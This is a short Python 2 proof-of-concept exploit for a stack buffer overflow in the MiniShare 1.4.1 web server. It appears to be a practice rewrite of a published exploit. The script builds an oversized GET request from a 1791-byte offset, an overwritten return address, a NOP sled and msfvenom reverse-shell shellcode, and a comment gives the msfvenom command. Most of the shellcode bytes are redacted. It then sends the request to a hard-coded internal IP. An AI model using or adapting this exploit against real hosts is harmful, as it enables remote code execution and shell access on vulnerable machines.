# minishare 1.4.1 PoC exploit rewrite by size_t, vulnerable application - https://www.exploit-db.com/exploits/616

#!/usr/bin/python

import socket
import sys


buffer = "A" * 1791
#0x77d32273
eip = "\x73\x22\xd3\x77"
#msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -f py â€“e x86/shikata_ga_nai -b "\x00\x0d"
buf =  b""
buf += b"\xda\xdc\xd9\x74\x24\xf4\xba\x93\x9f\xa5\xbd\x58\x33"
#...shellcode redacted...

get = "GET"
end = "HTTP/1.1\r\n\r\n"

nops = "\x90" * 30
junk = "D" * 100

payload = buffer + eip + nops + buf + junk + get + end

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.62.5', 80))
s.send(payload)
s.close()

print "Connection established..!"
